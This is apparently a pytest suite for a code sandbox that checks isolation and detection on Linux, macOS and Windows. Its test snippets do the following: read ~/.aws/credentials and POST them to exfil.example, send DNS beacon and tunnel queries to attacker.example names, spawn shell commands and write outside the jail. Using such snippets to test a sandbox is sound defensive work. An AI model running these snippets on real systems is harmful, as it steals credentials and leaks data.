"""Sandbox behaviour on Linux, macOS and Windows.

Most tests run on every OS (with the Rust binary when it is built, otherwise
through the Python fallback runner). The seccomp/Landlock test runs only on
Linux (CI: ubuntu-latest). The Docker test skips unless Docker and the image
are already present: the suite never pulls images.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
from pathlib import Path

import pytest

from modelsentinel import sandboxrun
from modelsentinel.sandboxrun import (
    findings_from_sandbox,
    locate_sandbox,
    run_fallback,
    run_source,
    summarize_result,
)

EXFIL = (
    "import os, urllib.request\n"
    "secret = open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "req = urllib.request.Request('http://exfil.example/collect', data=secret.encode())\n"
    "print(urllib.request.urlopen(req, timeout=1).read())\n"
)


@pytest.fixture(params=["auto", "fallback"])
def backend(request, monkeypatch):
    """Run each behavioural test through the binary (if built) and the fallback."""
    if request.param == "fallback":
        monkeypatch.setattr(sandboxrun, "locate_sandbox", lambda: None)
    return request.param


def test_canary_exfil_is_captured_with_hostname_and_payload(backend):
    result = run_source(EXFIL, timeout=10)
    assert result["executed"], result.get("error")
    assert result["canary_read"] is True
    assert result["outbound_attempt"] is True
    assert "exfil.example" in result["outbound_hosts"]
    assert result["exfil_canary"] is True
    payloads = [e for e in result["events"] if e["kind"] == "outbound_payload" and e.get("canary")]
    assert payloads and result["canary_token"] in payloads[0]["preview"]
    # The sink answers HTTP, so the snippet ran to completion.
    assert "ok" in result["stdout"]


def test_dns_lookup_and_raw_udp_dns_are_logged(backend):
    source = (
        "import socket\n"
        "socket.gethostbyname('beacon.attacker.example')\n"
        "q = b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00' + b'\\x04leak\\x06tunnel\\x07example\\x00\\x00\\x01\\x00\\x01'\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
        "s.sendto(q, ('8.8.8.8', 53))\n"
    )
    result = run_source(source, timeout=10)
    assert "beacon.attacker.example" in result["dns_queries"]
    assert "leak.tunnel.example" in result["dns_queries"]
    assert "8.8.8.8" in result["outbound_hosts"]


def test_process_spawn_is_blocked_and_marker_never_written(backend, tmp_path: Path):
    marker = tmp_path / "pwned.txt"
    # Every path is embedded with repr() so the snippet compiles on Windows too:
    # a raw "C:\Users\..." inside a normal string literal is a \U escape -> SyntaxError,
    # and then nothing runs and nothing is spawned.
    child_code = f"import pathlib; pathlib.Path({marker.as_posix()!r}).write_text('x')"
    shell_cmd = f"echo pwned > {marker.as_posix()}"
    source = (
        "import os, subprocess\n"
        f"try:\n    os.system({shell_cmd!r})\nexcept PermissionError:\n    print('system-blocked')\n"
        f"try:\n    subprocess.run([{sys.executable!r}, '-c', {child_code!r}])\n"
        "except PermissionError:\n    print('popen-blocked')\n"
    )
    compile(source, "snippet.py", "exec")  # the snippet itself must be valid on every OS
    result = run_source(source, timeout=10)
    errors = [e for e in result["events"] if e.get("kind") == "runtime_error"]
    assert not errors, errors
    assert result["process_spawn"] is True
    assert result["blocked_actions"] >= 2
    assert "system-blocked" in result["stdout"] and "popen-blocked" in result["stdout"]
    assert not marker.exists()


def test_write_outside_jail_blocked_and_jail_files_logged(backend, tmp_path: Path):
    outside = tmp_path / "outside.txt"
    source = (
        "open('inside.txt', 'w').write('hello')\n"
        "print(open('inside.txt').read())\n"
        f"try:\n    open({str(outside)!r}, 'w').write('x')\nexcept PermissionError:\n    print('outside-blocked')\n"
    )
    result = run_source(source, timeout=10)
    assert "outside-blocked" in result["stdout"]
    assert not outside.exists()
    opened = [e for e in result["events"] if e["kind"] == "file_access" and e["path"].endswith("inside.txt")]
    assert {e["write"] for e in opened} == {True, False}


def test_timeout_is_enforced(backend):
    result = run_source("while True:\n    pass\n", timeout=1)
    assert result["timed_out"] is True


def test_non_python_is_refused_not_executed():
    result = run_source("require('child_process').exec('id')", language="javascript")
    assert result["executed"] is False
    assert "unsupported language" in result["error"]
    summary = summarize_result(result)
    codes = {f.code for f in findings_from_sandbox(summary)}
    assert codes == {"sandbox_unavailable"}


def test_fallback_reports_reduced_isolation(tmp_path: Path):
    code = tmp_path / "s.py"
    code.write_text("print('hi')\n", encoding="utf-8")
    result = run_fallback(code, timeout=10)
    assert result["isolation"] == "reduced"
    assert result["backend"] == "python-fallback"
    assert "hi" in result["stdout"]


def assert_linux_enforcement(result: dict) -> None:
    """Assert what the in-sandbox probes saw, not what the kernel advertises."""
    from modelsentinel.sandboxrun import enforcement_problems, kernel_capabilities

    caps = kernel_capabilities()
    assert enforcement_problems(result, caps) == []
    assert "seccomp" in result["enforcement"]
    if caps.get("landlock_abi", 0) >= 1:
        assert "landlock" in result["enforcement"]
        assert result["isolation"] == "full"
    else:
        assert result["filesystem_probe"] != "landlock-blocked"
        assert result["isolation"] == "reduced" and result["isolation_notes"]


def test_isolation_level_matches_platform():
    if locate_sandbox() is None:
        pytest.skip("sentinel-sandbox is not built")
    result = run_source("print(1)\n", timeout=10)
    assert result["backend"] == "native"
    if sys.platform.startswith("linux"):
        assert_linux_enforcement(result)
    else:
        assert result["isolation"] == "reduced"
        assert result["isolation_notes"]
    if sys.platform == "darwin" and Path("/usr/bin/sandbox-exec").exists():
        assert "sandbox-exec-network" in result["enforcement"]


def test_findings_mapping_and_old_schema():
    old = {
        "enforcement": ["audit-hook", "seccomp", "landlock"],
        "canary_read": True,
        "outbound_attempt": False,
        "events": [{"kind": "outbound", "host": "evil.example", "port": 443}],
        "error": None,
    }
    summary = summarize_result(old)
    assert summary["isolation"] == "full"
    assert summary["outbound_attempt"] is True
    assert summary["outbound_hosts"] == ["evil.example"]
    findings = findings_from_sandbox(summary, location="task-1")
    severities = {f.code: (f.severity, f.category) for f in findings}
    assert severities["sandbox_canary_read"] == ("critical", "confirmed_exfiltration")
    assert severities["sandbox_outbound"] == ("high", "sandbox_outbound")
    assert "sandbox_isolation_reduced" not in severities

    clean = summarize_result({"isolation": "reduced", "executed": True, "events": [], "platform": "win32"})
    only = findings_from_sandbox(clean)
    assert [(f.severity, f.category) for f in only] == [("medium", "sandbox_isolation_reduced")]


def _docker_image_present(image: str) -> bool:
    docker = shutil.which("docker")
    if not docker:
        return False
    try:
        proc = subprocess.run([docker, "image", "inspect", image], capture_output=True, timeout=20, check=False)
    except (OSError, subprocess.TimeoutExpired):
        return False
    return proc.returncode == 0


def test_docker_backend_when_image_is_local():
    image = "python:3.11-slim"
    if locate_sandbox() is None:
        pytest.skip("sentinel-sandbox is not built")
    if not _docker_image_present(image):
        pytest.skip(f"docker or local image {image} not available (the suite never pulls)")
    result = run_source(EXFIL, timeout=20, docker=True)
    assert result["error"] is None, result["error"]
    assert result["isolation"] == "container"
    assert result["canary_read"] is True
    assert "exfil.example" in result["outbound_hosts"]


@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="Landlock is Linux-only")
def test_landlock_enforced_when_python_is_a_symlinked_venv(tmp_path: Path, monkeypatch):
    """Regression: from a uv/pyenv venv, Python read .venv/pyvenv.cfg outside the
    Landlock read roots, died with EACCES, and the sandbox fell back to no Landlock.

    CI sets MS_TEST_BASE_PYTHON to a uv-managed interpreter in ~/.local (outside
    /usr and /opt), so both the venv and its base live outside the default roots.
    """
    import os
    import subprocess

    from modelsentinel.sandboxrun import enforcement_problems, kernel_capabilities, locate_sandbox

    if locate_sandbox() is None:
        pytest.skip("sentinel-sandbox is not built")
    caps = kernel_capabilities()
    if caps.get("landlock_abi", 0) < 1:
        pytest.skip("kernel has no Landlock")
    base = os.environ.get("MS_TEST_BASE_PYTHON") or sys.executable
    venv = tmp_path / "venv"
    subprocess.run([base, "-m", "venv", "--without-pip", "--symlinks", str(venv)], check=True)
    python = venv / "bin" / "python"
    assert python.is_symlink() and (venv / "pyvenv.cfg").is_file()
    monkeypatch.setenv("SENTINEL_PYTHON", str(python))
    source = "open('inside.txt', 'w').write('ok')\nprint(open('inside.txt').read())\n"
    result = run_source(source, timeout=20)
    status = result.get("restrict_status") or ""
    assert "retried-without-landlock" not in status, (status, result.get("stderr"))
    assert enforcement_problems(result, caps) == [], (status, result.get("stderr"))
    assert result["isolation"] == "full"
    assert "ok" in result["stdout"], result.get("stderr")
